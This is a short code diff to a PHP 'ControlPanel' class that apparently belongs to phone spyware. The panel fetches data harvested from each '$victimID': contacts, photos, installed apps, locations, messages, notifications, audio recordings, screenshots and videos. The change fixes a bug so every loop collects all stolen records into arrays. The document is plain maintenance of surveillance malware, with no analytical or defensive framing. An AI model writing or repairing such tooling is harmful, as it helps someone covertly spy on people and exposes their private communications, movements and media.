@@ -552,7 +552,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $contacts = new Contact(
+            $contacts[] = new Contact(
                 $row['id'],
                 $row['client_id'],
                 $row['name'],
@@ -582,7 +582,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $images = new Image(
+            $images[] = new Image(
                 $row['id'],
                 $row['client_id'],
                 $row['filename'],
@@ -612,7 +612,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $installedApps = new InstalledApp(
+            $installedApps[] = new InstalledApp(
                 $row['id'],
                 $row['client_id'],
                 $row['package_name'],
@@ -643,7 +643,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $knownLocations = new Location(
+            $knownLocations[] = new Location(
                 $row['id'],
                 $row['client_id'],
                 $row['latitude'],
@@ -675,7 +675,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $messages = new Message(
+            $messages[] = new Message(
                 $row['id'],
                 $row['client_id'],
                 $row['sender'],
@@ -706,7 +706,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $notifications = new Notification(
+            $notifications[] = new Notification(
                 $row['id'],
                 $row['client_id'],
                 $row['sender'],
@@ -737,7 +737,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $recordings = new Recording(
+            $recordings[] = new Recording(
                 $row['id'],
                 $row['client_id'],
                 $row['filename'],
@@ -767,7 +767,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $screenshots = new Screenshot(
+            $screenshots[] = new Screenshot(
                 $row['id'],
                 $row['client_id'],
                 $row['filename'],
@@ -797,7 +797,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $videos = new Video(
+            $videos[] = new Video(
                 $row['id'],
                 $row['client_id'],
                 $row['filename'],
